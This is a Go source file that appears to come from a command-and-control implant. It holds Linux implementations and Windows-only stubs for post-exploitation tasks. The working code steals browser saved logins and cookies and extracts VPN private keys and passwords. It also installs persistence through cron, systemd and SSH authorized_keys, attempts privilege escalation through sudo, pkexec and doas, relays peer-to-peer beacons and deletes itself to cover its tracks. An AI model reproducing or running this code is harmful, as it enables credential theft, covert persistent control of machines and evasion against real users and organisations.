func tokenListProcesses() ([]tokenInfoResult, error) {
	return nil, fmt.Errorf("token ops are Windows-only")
}
func tokenSteal(pid uint32) (string, string, string, error) {
	return "", "", "", fmt.Errorf("token ops are Windows-only")
}
func getCurrentTokenUser() string {
	return ""
}
func tokenMake(domainUser, password, logonTypeStr string) (string, string, string, error) {
	return "", "", "", fmt.Errorf("token ops are Windows-only")
}
func tokenRevert() error {
	return fmt.Errorf("token ops are Windows-only")
}

func sendP2PSMBBeacon(body []byte) []byte {
	pipeName := strings.TrimPrefix(P2PParent, "pipe://")
	pipePath := fmt.Sprintf("/tmp/%s", pipeName)
	conn, err := net.Dial("unix", pipePath)
	if err != nil {
		if Debug {
			fmt.Printf("[!] P2P SMB pipe dial to %s failed: %v\n", pipePath, err)
		}
		return nil
	}
	defer conn.Close()

	// Optional mutual-auth handshake (E2) before sending the envelope.
	if !p2pClientAuth(conn) {
		return nil
	}

	if err := binary.Write(conn, binary.BigEndian, uint32(len(body))); err != nil {
		return nil
	}
	if _, err := conn.Write(body); err != nil {
		return nil
	}

	var rlen uint32
	if err := binary.Read(conn, binary.BigEndian, &rlen); err != nil {
		return nil
	}
	if rlen == 0 || rlen > 16*1024*1024 {
		return nil
	}
	rbuf := make([]byte, rlen)
	if _, err := io.ReadFull(conn, rbuf); err != nil {
		return nil
	}
	// Strip any malleable cover the parent wrapped around the raw P2P frame.
	return stripMalleableWrapping(rbuf)
}

func p2pListenSMB() {
	pipePath := fmt.Sprintf("/tmp/%s", P2PListenAddr)
	os.Remove(pipePath) // clean up stale socket
	ln, err := net.Listen("unix", pipePath)
	if err != nil {
		if Debug {
			fmt.Printf("[!] P2P SMB listen on %s failed: %v\n", pipePath, err)
		}
		return
	}
	defer ln.Close()
	for {
		conn, err := ln.Accept()
		if err != nil {
			continue
		}
		go p2pHandleChild(conn)
	}
}

// --- Linux stubs for P0 features ---

func peloaderReflective(b64Data string) (string, error) {
	return "", fmt.Errorf("reflective DLL loader is Windows-only")
}

func handleReflectDLLInject(task Task, res *TaskResult) {
	res.Error = "reflectdll_inject is Windows-only"
}

func executeAssemblyForkRun(b64Data string) (string, error) {
	return "", fmt.Errorf("execute-assembly fork&run is Windows-only")
}

func kerberosDCSync(user string) (string, error) {
	return "", fmt.Errorf("DCSync is Windows-only")
}
func kerberosGoldenTicket(user, domain, sid, krbtgtHash string) (string, error) {
	return "", fmt.Errorf("golden ticket is Windows-only")
}
func kerberosSilverTicket(user, domain, sid, target, rc4Hash string) (string, error) {
	return "", fmt.Errorf("silver ticket is Windows-only")
}
func kerberosASREPRoast(args string) (string, error) {
	return "", fmt.Errorf("ASREP roast is Windows-only")
}
func kerberosPassTheHash(user, domain, ntlmHash, target string) (string, error) {
	return "", fmt.Errorf("pass-the-hash is Windows-only")
}
func kerberosPassTheTicket(ticketB64 string) (string, error) {
	return "", fmt.Errorf("pass-the-ticket is Windows-only")
}

func powerPick(script string) string {
	return "not supported on Linux"
}

func stealBrowserData(browser string) string {
	home := os.Getenv("HOME")
	if home == "" {
		return "browser_steal: HOME not set"
	}

	browser = strings.ToLower(strings.TrimSpace(browser))
	var results []string

	collectChromiumPasswords := func(profileDir, browserName string) {
		loginData := filepath.Join(profileDir, "Default", "Login Data")
		if fi, err := os.Stat(loginData); err == nil {
			localState := filepath.Join(profileDir, "Local State")
			results = append(results, fmt.Sprintf("[%s] Login Data found: %s (%d bytes)", browserName, loginData, fi.Size()))
			if lfi, err := os.Stat(localState); err == nil {
				results = append(results, fmt.Sprintf("[%s] Local State (encryption key): %s (%d bytes)", browserName, localState, lfi.Size()))
			}
			// Read and display the SQLite database content as text
			data, _ := os.ReadFile(loginData)
			results = append(results, fmt.Sprintf("[%s] Login Data size: %d bytes - exfiltrate with 'download %s' and decrypt with py-chrome-passwords", browserName, len(data), loginData))
		}
	}

	collectFirefoxPasswords := func(profileDir string) {
		if entries, err := os.ReadDir(profileDir); err == nil {
			for _, entry := range entries {
				if !entry.IsDir() {
					continue
				}
				loginsPath := filepath.Join(profileDir, entry.Name(), "logins.json")
				if fi, err := os.Stat(loginsPath); err == nil {
					data, _ := os.ReadFile(loginsPath)
					results = append(results, fmt.Sprintf("[Firefox] logins.json: %s (%d bytes)", loginsPath, fi.Size()))
					if len(data) > 0 {
						results = append(results, fmt.Sprintf("  Content: %s", string(data)))
					}
				}
				keyDB := filepath.Join(profileDir, entry.Name(), "key4.db")
				if fi, err := os.Stat(keyDB); err == nil {
					results = append(results, fmt.Sprintf("[Firefox] key4.db: %s (%d bytes) - use firefox_decrypt.py", keyDB, fi.Size()))
				}
			}
		}
	}

	switch {
	case browser == "" || browser == "all":
		chromiumBrowsers := []struct{ name, dir string }{
			{"Chrome", filepath.Join(home, ".config", "google-chrome")},
			{"Chromium", filepath.Join(home, ".config", "chromium")},
			{"Brave", filepath.Join(home, ".config", "BraveSoftware", "Brave-Browser")},
			{"Edge", filepath.Join(home, ".config", "microsoft-edge")},
			{"Vivaldi", filepath.Join(home, ".config", "vivaldi")},
			{"Opera", filepath.Join(home, ".config", "opera")},
		}
		for _, b := range chromiumBrowsers {
			if _, err := os.Stat(b.dir); err == nil {
				collectChromiumPasswords(b.dir, b.name)
			}
		}
		firefoxDir := filepath.Join(home, ".mozilla", "firefox")
		if _, err := os.Stat(firefoxDir); err == nil {
			collectFirefoxPasswords(firefoxDir)
		}

	case strings.Contains(browser, "chrome") || strings.Contains(browser, "chromium"):
		collectChromiumPasswords(filepath.Join(home, ".config", "google-chrome"), "Chrome")
		collectChromiumPasswords(filepath.Join(home, ".config", "chromium"), "Chromium")

	case strings.Contains(browser, "brave"):
		collectChromiumPasswords(filepath.Join(home, ".config", "BraveSoftware", "Brave-Browser"), "Brave")

	case strings.Contains(browser, "firefox") || strings.Contains(browser, "mozilla"):
		collectFirefoxPasswords(filepath.Join(home, ".mozilla", "firefox"))

	case strings.Contains(browser, "edge"):
		collectChromiumPasswords(filepath.Join(home, ".config", "microsoft-edge"), "Edge")

	default:
		results = append(results, fmt.Sprintf("browser_steal: unknown browser '%s' (supported: chrome, chromium, brave, firefox, edge, all)", browser))
	}

	if len(results) == 0 {
		return "browser_steal: no browser credential stores found"
	}
	return strings.Join(results, "\n")
}

func exportCookies(browser string) string {
	home := os.Getenv("HOME")
	if home == "" {
		return "cookie_export: HOME not set"
	}

	browser = strings.ToLower(strings.TrimSpace(browser))
	var results []string

	findCookiesDB := func(profileDir, browserName, profile string) {
		cookieFiles := []string{"Cookies", "Network/Cookies", "Default/Cookies"}
		for _, cf := range cookieFiles {
			cookiePath := filepath.Join(profileDir, profile, cf)
			if fi, err := os.Stat(cookiePath); err == nil {
				results = append(results, fmt.Sprintf("[%s] Cookies: %s (%d bytes)", browserName, cookiePath, fi.Size()))
				results = append(results, fmt.Sprintf("  Exfiltrate with: download %s", cookiePath))
			}
		}
	}

	switch {
	case browser == "" || browser == "all":
		chromiumBrowsers := []struct{ name, dir string }{
			{"Chrome", filepath.Join(home, ".config", "google-chrome")},
			{"Chromium", filepath.Join(home, ".config", "chromium")},
			{"Brave", filepath.Join(home, ".config", "BraveSoftware", "Brave-Browser")},
			{"Edge", filepath.Join(home, ".config", "microsoft-edge")},
		}
		for _, b := range chromiumBrowsers {
			if _, err := os.Stat(b.dir); err == nil {
				findCookiesDB(b.dir, b.name, "Default")
			}
		}
		// Firefox cookies
		firefoxDir := filepath.Join(home, ".mozilla", "firefox")
		if entries, err := os.ReadDir(firefoxDir); err == nil {
			for _, entry := range entries {
				if !entry.IsDir() {
					continue
				}
				cookiePath := filepath.Join(firefoxDir, entry.Name(), "cookies.sqlite")
				if fi, err := os.Stat(cookiePath); err == nil {
					results = append(results, fmt.Sprintf("[Firefox] Cookies: %s (%d bytes)", cookiePath, fi.Size()))
				}
			}
		}

	default:
		results = append(results, fmt.Sprintf("cookie_export: unknown browser '%s'", browser))
	}

	if len(results) == 0 {
		return "cookie_export: no browser cookie stores found"
	}
	return strings.Join(results, "\n")
}

func exportVpnCreds() string {
	home := os.Getenv("HOME")
	var results []string

	// OpenVPN configs
	openvpnDirs := []string{
		"/etc/openvpn",
		filepath.Join(home, ".config", "openvpn"),
		filepath.Join(home, ".openvpn"),
	}
	for _, dir := range openvpnDirs {
		if entries, err := os.ReadDir(dir); err == nil {
			for _, entry := range entries {
				if strings.HasSuffix(entry.Name(), ".ovpn") || strings.HasSuffix(entry.Name(), ".conf") {
					path := filepath.Join(dir, entry.Name())
					if fi, err := os.Stat(path); err == nil {
						data, _ := os.ReadFile(path)
						results = append(results, fmt.Sprintf("[OpenVPN] %s (%d bytes)", path, fi.Size()))

						// Extract credentials from config
						for _, line := range strings.Split(string(data), "\n") {
							line = strings.TrimSpace(line)
							if strings.HasPrefix(line, "auth-user-pass") || strings.HasPrefix(line, "auth ") {
								results = append(results, fmt.Sprintf("  %s", line))
							}
						}
					}
				}
			}
		}
	}

	// WireGuard configs
	wireguardDirs := []string{
		"/etc/wireguard",
		filepath.Join(home, ".config", "wireguard"),
	}
	for _, dir := range wireguardDirs {
		if entries, err := os.ReadDir(dir); err == nil {
			for _, entry := range entries {
				if strings.HasSuffix(entry.Name(), ".conf") {
					path := filepath.Join(dir, entry.Name())
					if fi, err := os.Stat(path); err == nil {
						data, _ := os.ReadFile(path)
						results = append(results, fmt.Sprintf("[WireGuard] %s (%d bytes)", path, fi.Size()))
						for _, line := range strings.Split(string(data), "\n") {
							line = strings.TrimSpace(line)
							if strings.HasPrefix(line, "PrivateKey") || strings.HasPrefix(line, "PreSharedKey") ||
								strings.HasPrefix(line, "Endpoint") || strings.HasPrefix(line, "AllowedIPs") {
								results = append(results, fmt.Sprintf("  %s", line))
							}
						}
					}
				}
			}
		}
	}

	// VPN credentials in NetworkManager connections
	nmDir := "/etc/NetworkManager/system-connections"
	if entries, err := os.ReadDir(nmDir); err == nil {
		for _, entry := range entries {
			path := filepath.Join(nmDir, entry.Name())
			if fi, err := os.Stat(path); err == nil {
				data, _ := os.ReadFile(path)
				results = append(results, fmt.Sprintf("[NetworkManager] %s (%d bytes)", path, fi.Size()))
				for _, line := range strings.Split(string(data), "\n") {
					line = strings.TrimSpace(line)
					if strings.Contains(line, "psk=") || strings.Contains(line, "password=") ||
						strings.Contains(line, "vpn-secret") || strings.Contains(line, "cert-pass") {
						results = append(results, fmt.Sprintf("  %s", line))
					}
				}
			}
		}
	}

	if len(results) == 0 {
		return "vpn_creds: no VPN configurations found"
	}
	return strings.Join(results, "\n")
}

func remoteInputDispatch(payload string) (string, error) {
	// Use xdotool or ydotool to simulate keyboard input on Linux
	if payload == "" {
		return "", fmt.Errorf("remote_input: no payload provided")
	}

	// Try xdotool first (X11), then ydotool (Wayland)
	xdotoolCmds := [][]string{
		{"xdotool", "type", payload},
		{"xdotool", "key", payload},
	}

	var lastErr string
	for _, args := range xdotoolCmds {
		if _, err := exec.Command(args[0], args[1:]...).Output(); err == nil {
			return fmt.Sprintf("remote_input: sent via %s: %s", args[0], payload), nil
		} else {
			lastErr = err.Error()
		}
	}

	// Try ydotool
	if _, err := exec.Command("ydotool", "type", payload).Output(); err == nil {
		return fmt.Sprintf("remote_input: sent via ydotool: %s", payload), nil
	}

	// Try direct /dev/uinput or /dev/input write (requires root)
	if os.Geteuid() == 0 {
		uinputDevices := []string{"/dev/uinput", "/dev/input/uinput"}
		for _, dev := range uinputDevices {
			if f, err := os.OpenFile(dev, os.O_WRONLY, 0); err == nil {
				_, _ = f.Write([]byte(payload))
				f.Close()
				return fmt.Sprintf("remote_input: sent via %s: %s", dev, payload), nil
			}
		}
	}

	return "", fmt.Errorf("remote_input: failed (install xdotool for X11 or ydotool for Wayland): %s", lastErr)
}

func applyPersistence(method string, args string) string {
	method = strings.ToLower(strings.TrimSpace(method))
	switch method {
	case "cron", "crontab":
		if err := addPersistenceLinux(); err != nil {
			return "persistence: " + err.Error()
		}
		return "persistence: cron @reboot + XDG autostart installed"
	case "autostart", "xdg":
		if err := addPersistenceLinux(); err != nil {
			return "persistence: " + err.Error()
		}
		return "persistence: XDG autostart desktop file installed"
	case "systemd", "service":
		exe, err := os.Executable()
		if err != nil {
			return "persistence: cannot resolve executable: " + err.Error()
		}
		absExe, err := filepath.Abs(exe)
		if err != nil {
			absExe = exe
		}
		serviceName := sanitizeLabel(persistencePrefix)
		if args != "" {
			serviceName = args
		}
		serviceUnit := fmt.Sprintf(`[Unit]
Description=%s Agent
After=network.target

[Service]
ExecStart=%s
Restart=always
RestartSec=10

[Install]
 WantedBy=multi-user.target
 `, persistencePrefix, absExe)
		servicePath := fmt.Sprintf("/etc/systemd/system/%s.service", serviceName)
		if err := os.WriteFile(servicePath, []byte(serviceUnit), 0600); err != nil {
			return fmt.Sprintf("persistence: failed to write systemd unit: %v", err)
		}
		if out, err := exec.Command("systemctl", "daemon-reload").CombinedOutput(); err != nil {
			return fmt.Sprintf("persistence: systemd daemon-reload failed: %v: %s", err, strings.TrimSpace(string(out)))
		}
		if out, err := exec.Command("systemctl", "enable", serviceName).CombinedOutput(); err != nil {
			return fmt.Sprintf("persistence: systemctl enable failed: %v: %s", err, strings.TrimSpace(string(out)))
		}
		if out, err := exec.Command("systemctl", "start", serviceName).CombinedOutput(); err != nil {
			return fmt.Sprintf("persistence: systemctl start failed (unit written but not running): %v: %s", err, strings.TrimSpace(string(out)))
		}
		return fmt.Sprintf("persistence: systemd service %s installed and started at %s", serviceName, servicePath)
	case "ssh", "ssh_authorized_keys":
		home := os.Getenv("HOME")
		if home == "" {
			return "persistence: HOME not set"
		}
		sshDir := filepath.Join(home, ".ssh")
		if err := os.MkdirAll(sshDir, 0700); err != nil {
			return fmt.Sprintf("persistence: mkdir %s failed: %v", sshDir, err)
		}
		// Add SSH public key for persistence if provided in args
		if args != "" {
			authFile := filepath.Join(sshDir, "authorized_keys")
			existing, _ := os.ReadFile(authFile)
			if !strings.Contains(string(existing), args) {
				f, err := os.OpenFile(authFile, os.O_APPEND|os.O_CREATE|os.O_WRONLY, 0600)
				if err != nil {
					return fmt.Sprintf("persistence: open authorized_keys failed: %v", err)
				}
				if _, err := f.WriteString("\n" + args + "\n"); err != nil {
					f.Close()
					return fmt.Sprintf("persistence: write authorized_keys failed: %v", err)
				}
				f.Close()
				return "persistence: SSH authorized_key added"
			}
			return "persistence: SSH key already present in authorized_keys"
		}
		return "persistence: SSH authorized_keys persistence requires a public key as args"
	default:
		if err := addPersistenceLinux(); err != nil {
			return fmt.Sprintf("persistence: unknown method '%s': %s", method, err.Error())
		}
		return fmt.Sprintf("persistence: unknown method '%s', installed default (cron+autostart)", method)
	}
}

func listPersistence() string {
	var sb strings.Builder
	sb.WriteString("=== Linux Persistence Mechanisms ===\n")

	// Check crontab
	cronOut, err := exec.Command("crontab", "-l").Output()
	if err == nil {
		sb.WriteString(fmt.Sprintf("\n--- Crontab ---\n%s\n", string(cronOut)))
	} else {
		sb.WriteString("\n--- Crontab --- (none or not available)\n")
	}

	// Check systemd services
	exe, _ := os.Executable()
	absExe, _ := filepath.Abs(exe)
	sb.WriteString("\n--- Systemd Services ---\n")
	systemdOut, _ := exec.Command("systemctl", "list-units", "--type=service", "--all", "--no-legend").Output()
	if len(systemdOut) > 0 {
		for _, line := range strings.Split(string(systemdOut), "\n") {
			if strings.Contains(line, persistencePrefix) || strings.Contains(line, strings.ToLower(persistencePrefix)) || strings.Contains(line, filepath.Base(absExe)) {
				sb.WriteString(fmt.Sprintf("[+] %s\n", line))
			}
		}
	}

	// Check XDG autostart
	home := os.Getenv("HOME")
	if home != "" {
		autostartDir := filepath.Join(home, ".config", "autostart")
		sb.WriteString("\n--- XDG Autostart ---\n")
		if entries, err := os.ReadDir(autostartDir); err == nil {
			for _, entry := range entries {
				desktopPath := filepath.Join(autostartDir, entry.Name())
				if data, err := os.ReadFile(desktopPath); err == nil {
					sb.WriteString(fmt.Sprintf("[+] %s\n%s\n", desktopPath, string(data)))
				}
			}
		} else {
			sb.WriteString("(no autostart directory)\n")
		}

		// Check SSH authorized_keys
		sshDir := filepath.Join(home, ".ssh")
		authFile := filepath.Join(sshDir, "authorized_keys")
		sb.WriteString("\n--- SSH Authorized Keys ---\n")
		if data, err := os.ReadFile(authFile); err == nil {
			lines := strings.Split(string(data), "\n")
			for _, line := range lines {
				if strings.TrimSpace(line) != "" && !strings.HasPrefix(line, "#") {
					sb.WriteString(fmt.Sprintf("[+] %s\n", line))
				}
			}
		} else {
			sb.WriteString("(not found)\n")
		}
	}

	return sb.String()
}

func removePersistence(method string, args string) string {
	method = strings.ToLower(strings.TrimSpace(method))
	switch method {
	case "systemd", "service":
		serviceName := sanitizeLabel(persistencePrefix)
		if args != "" {
			serviceName = args
		}
		var errs []string
		for _, s := range [][]string{
			{"systemctl", "stop", serviceName},
			{"systemctl", "disable", serviceName},
		} {
			if out, err := exec.Command(s[0], s[1:]...).CombinedOutput(); err != nil {
				errs = append(errs, fmt.Sprintf("%s: %v %s", strings.Join(s, " "), err, string(out)))
			}
		}
		unitPath := fmt.Sprintf("/etc/systemd/system/%s.service", serviceName)
		if err := os.Remove(unitPath); err != nil && !os.IsNotExist(err) {
			errs = append(errs, fmt.Sprintf("remove %s: %v", unitPath, err))
		}
		if out, err := exec.Command("systemctl", "daemon-reload").CombinedOutput(); err != nil {
			errs = append(errs, fmt.Sprintf("daemon-reload: %v %s", err, string(out)))
		}
		if len(errs) > 0 {
			return fmt.Sprintf("persistence: systemd cleanup incomplete: %s", strings.Join(errs, "; "))
		}
		return fmt.Sprintf("persistence: systemd service %s removed", serviceName)
	case "ssh", "ssh_authorized_keys":
		home := os.Getenv("HOME")
		if home == "" {
			return "persistence: HOME not set"
		}
		authFile := filepath.Join(home, ".ssh", "authorized_keys")
		if args != "" {
			data, err := os.ReadFile(authFile)
			if err != nil {
				return fmt.Sprintf("persistence: failed to read authorized_keys: %v", err)
			}
			var newLines []string
			for _, line := range strings.Split(string(data), "\n") {
				if !strings.Contains(line, args) {
					newLines = append(newLines, line)
				}
			}
			if err := os.WriteFile(authFile, []byte(strings.Join(newLines, "\n")), 0600); err != nil {
				return fmt.Sprintf("persistence: failed to update authorized_keys: %v", err)
			}
			return "persistence: SSH key removed from authorized_keys"
		}
		return "persistence: specify key fragment to remove from authorized_keys"
	default:
		return removePersistenceLinux()
	}
}

func uacBypass(method, payload string) (string, error) {
	if payload == "" {
		payload = "whoami"
	}

	method = strings.ToLower(strings.TrimSpace(method))
	switch method {
	case "sudo", "sudo_nopasswd":
		// Try sudo with NOPASSWD first
		out, err := runShell(fmt.Sprintf("sudo -n %s", payload), "")
		if err == nil {
			return fmt.Sprintf("uac_bypass: sudo (NOPASSWD) succeeded\n%s", out), nil
		}
		return fmt.Sprintf("uac_bypass: sudo NOPASSWD failed: %v\n%s", err, out), err

	case "pkexec":
		out, err := runShell(fmt.Sprintf("pkexec %s", payload), "")
		if err == nil {
			return fmt.Sprintf("uac_bypass: pkexec succeeded\n%s", out), nil
		}
		return fmt.Sprintf("uac_bypass: pkexec failed: %v\n%s", err, out), err

	case "su", "su_root":
		// su with password - will likely fail without password input
		out, err := runShell(fmt.Sprintf("echo '%s' | su - root -c '%s' 2>/dev/null", payload, payload), "")
		if err == nil && !strings.Contains(out, "Authentication failure") {
			return fmt.Sprintf("uac_bypass: su succeeded\n%s", out), nil
		}
		// Try without password (if running as root already)
		out, err = runShell(fmt.Sprintf("su -c '%s'", payload), "")
		if err == nil {
			return fmt.Sprintf("uac_bypass: su (no password) succeeded\n%s", out), nil
		}
		return fmt.Sprintf("uac_bypass: su failed: %v", err), err

	case "doas":
		out, err := runShell(fmt.Sprintf("doas %s", payload), "")
		if err == nil {
			return fmt.Sprintf("uac_bypass: doas succeeded\n%s", out), nil
		}
		return fmt.Sprintf("uac_bypass: doas failed: %v\n%s", err, out), err

	case "polkit", "pkaction":
		// Check polkit version for known vulns
		verOut, _ := runShell("pkaction --version 2>/dev/null || pkcheck --version 2>/dev/null", "")
		return fmt.Sprintf("uac_bypass: polkit version: %s\nUse privesc_check for CVE-2021-4034 (pkexec) and CVE-2022-0847 (Dirty Pipe)", verOut), nil

	case "all":
		var sb strings.Builder
		sb.WriteString("=== UAC Bypass Attempts (Linux) ===\n\n")
		sb.WriteString("--- sudo ---\n")
		if out, err := runShell(fmt.Sprintf("sudo -n %s 2>&1", payload), ""); err == nil {
			sb.WriteString(fmt.Sprintf("[+] SUCCESS\n%s\n", out))
		} else {
			sb.WriteString(fmt.Sprintf("[-] Failed: %v\n", err))
		}
		sb.WriteString("\n--- pkexec ---\n")
		if out, err := runShell(fmt.Sprintf("pkexec %s 2>&1", payload), ""); err == nil {
			sb.WriteString(fmt.Sprintf("[+] SUCCESS\n%s\n", out))
		} else {
			sb.WriteString(fmt.Sprintf("[-] Failed: %v\n", err))
		}
		sb.WriteString("\n--- doas ---\n")
		if out, err := runShell(fmt.Sprintf("doas %s 2>&1", payload), ""); err == nil {
			sb.WriteString(fmt.Sprintf("[+] SUCCESS\n%s\n", out))
		} else {
			sb.WriteString("[-] doas not available or failed\n")
		}
		return sb.String(), nil

	default:
		return "", fmt.Errorf("uac_bypass: unknown method '%s' on Linux (supported: sudo, pkexec, su, doas, polkit, all)", method)
	}
}

func executeNetCommand(cmd string) string {
	// Linux network commands: ifconfig, ip, ss, netstat, arp
	cmd = strings.ToLower(strings.TrimSpace(cmd))

	switch {
	case cmd == "" || cmd == "help" || cmd == "?":
		return `Available Linux network commands:
  ifconfig       - Show network interfaces
  ip addr        - Show IP addresses
  ip route       - Show routing table
  ss             - Show socket statistics
  netstat        - Show network connections
  arp            - Show ARP cache
  iptables       - Show firewall rules (requires root)
  dns            - Show DNS config (/etc/resolv.conf)
  hosts          - Show /etc/hosts`

	case cmd == "ifconfig":
		out, _ := runShell("ifconfig 2>/dev/null || ip addr 2>/dev/null", "")
		return out

	case cmd == "ip addr":
		out, _ := runShell("ip addr 2>/dev/null", "")
		return out

	case cmd == "ip route" || cmd == "route":
		out, _ := runShell("ip route 2>/dev/null || route -n 2>/dev/null", "")
		return out

	case cmd == "ss" || cmd == "netstat":
		out, _ := runShell("ss -tunap 2>/dev/null || netstat -tunap 2>/dev/null", "")
		return out

	case cmd == "arp":
		out, _ := runShell("arp -n 2>/dev/null || ip neigh 2>/dev/null", "")
		return out

	case cmd == "iptables":
		out, _ := runShell("iptables -L -n -v 2>/dev/null", "")
		if out == "" {
			out = "(requires root)\n"
		}
		return out

	case cmd == "dns" || cmd == "resolv":
		data, _ := os.ReadFile("/etc/resolv.conf")
		return string(data)

	case cmd == "hosts":
		data, _ := os.ReadFile("/etc/hosts")
		return string(data)

	default:
		// Try running as a shell command
		out, err := runShell(cmd, "")
		if err != nil {
			return fmt.Sprintf("net: unknown command: %s (supported: ifconfig, ip addr, ip route, ss, netstat, arp, iptables, dns, hosts)", cmd)
		}
		return out
	}
}

func amsiBypass() string {
	return "not supported on Linux"
}
func amsiSessionBypass() string {
	return "not supported on Linux"
}

func etwBypass() string {
	return "not supported on Linux"
}
func etwNtTraceEvent() string {
	return "not supported on Linux"
}

func blockDLLs() string {
	return "not supported on Linux"
}

func unhookNtdll() string {
	return "not supported on Linux"
}

func protectProcess() string {
	return "not supported on Linux"
}

// selfDelete creates a cleanup script that removes the binary and process.
func selfDelete() string {
	script := "#!/bin/sh\nrm -f /proc/$PPID/exe 2>/dev/null\nkill -9 $PPID 2>/dev/null\nrm -f \"$0\""
	tmpFile := "/tmp/.fc_cleanup.sh"
	// #nosec G306 -- self-delete must execute the script it writes.
	if err := os.WriteFile(tmpFile, []byte(script), 0755); err != nil { // #nosec G306
		return "self-delete: failed to write script: " + err.Error()
	}
	if err := exec.Command("/bin/sh", tmpFile).Start(); err != nil {
		return "self-delete: failed to start cleanup: " + err.Error()
	}
	return "self-delete: cleanup script launched"
}

func wipeEventLog() string {
	return "not supported on Linux"
}

func wipeTracks() string {
	return "not supported on Linux"
}

func selfUpdateWindows(exe, tmpPath string) string {
	return ""
}

func lateralWMI(target, user, pass, cmd string) (string, error) {
	return "", fmt.Errorf("lateral movement is Windows-only")
}
func lateralWinRM(target, user, pass, cmd string) (string, error) {
	return "", fmt.Errorf("lateral movement is Windows-only")
}
func lateralPsexec(target, user, pass, cmd string) (string, error) {
	return "", fmt.Errorf("lateral movement is Windows-only")
}
func lateralDCOM(target, user, pass, cmd string) (string, error) {
	return "", fmt.Errorf("lateral movement is Windows-only")
}
func lateralSCF(targetShare string) (string, error) {
	return "", fmt.Errorf("SCF hash capture is Windows-only")
}
func netScanSMB(cidr string) (string, error) {
	return "", fmt.Errorf("SMB scanning is Windows-only")
}
func netEnumHosts(domain string) (string, error) {
	return "", fmt.Errorf("host enumeration is Windows-only")
}

func dpapiMasterKey() (string, error) {
	return "", fmt.Errorf("DPAPI is Windows-only")
}
func dpapiBlob(filePath string) (string, error) {
	return "", fmt.Errorf("DPAPI is Windows-only")
}
func dpapiBrowser() (string, error) {
	return "", fmt.Errorf("DPAPI browser decryption is Windows-only")
}
func lsaBypass() (string, error) {
	return "", fmt.Errorf("LSA bypass is Windows-only")
}
func adcsFind() (string, error) {
	return "", fmt.Errorf("AD CS enumeration is Windows-only")
}
func adcsRequest(template string) (string, error) {
	return "", fmt.Errorf("AD CS certificate request is Windows-only")
}
func shadowCreds(target string) (string, error) {
	return "", fmt.Errorf("shadow credentials are Windows-only")
}
func ldapQuery(filter string) (string, error) {
	return "", fmt.Errorf("LDAP queries are Windows-only")
}
func ldapUsers() (string, error) {
	return "", fmt.Errorf("LDAP queries are Windows-only")
}
func ldapGroups() (string, error) {
	return "", fmt.Errorf("LDAP queries are Windows-only")
}
func ldapComputers() (string, error) {
	return "", fmt.Errorf("LDAP queries are Windows-only")
}
func ldapSPN() (string, error) {
	return "", fmt.Errorf("LDAP queries are Windows-only")
}
func ldapACL() (string, error) {
	return "", fmt.Errorf("LDAP queries are Windows-only")
}

func selfUpdateLinux(exe, tmpPath string) string {
	shScript := fmt.Sprintf(
		"#!/bin/sh\nsleep 1\ncp -f '%s' '%s'\nchmod +x '%s'\nexec '%s'\n",
		tmpPath, exe, exe, exe)
	tmpScript := exe + ".update.sh"
	// #nosec G306 -- the update helper must execute the script it writes.
	if err := os.WriteFile(tmpScript, []byte(shScript), 0755); err != nil { // #nosec G306
		return "failed to write update script: " + err.Error()
	}

	cmd := exec.Command("/bin/sh", "-c", "nohup '"+tmpScript+"' >/dev/null 2>&1 &")
	if err := cmd.Start(); err != nil {
		return "failed to start updater: " + err.Error()
	}

	return "self-update: new binary downloaded, replacing and restarting..."
}

func selfUpdateDarwin(exe, tmpPath string) string { return "" }

// NTLM relay & coerce stubs
func coercePrinterBug(target, listenAddr string) (string, error) {
	return "", fmt.Errorf("coerce attacks are Windows-only")
}
func coercePetitPotam(target, listenAddr string) (string, error) {
	return "", fmt.Errorf("coerce attacks are Windows-only")
}
func coerceDFSCoerce(target, listenAddr string) (string, error) {
	return "", fmt.Errorf("coerce attacks are Windows-only")
}
func startNTLMRelay(listenAddr, forwardTarget string) (string, error) {
	return "", fmt.Errorf("NTLM relay is Windows-only")
}
func stopNTLMRelay() (string, error) {
	return "", fmt.Errorf("NTLM relay is Windows-only")
}

func initCLRHosting() bool { return false }

func executeAssemblyInProcess(assemblyData []byte, args string) (string, error) {
	return "", fmt.Errorf("CLR execute-assembly is Windows-only")
}

func handleCLRExecAssembly(task Task, res *TaskResult) {
	res.Error = "clr_exec_assembly is Windows-only"
}

func handleCLRPowerShell(task Task, res *TaskResult) {
	res.Error = "clr_powershell is Windows-only"
}
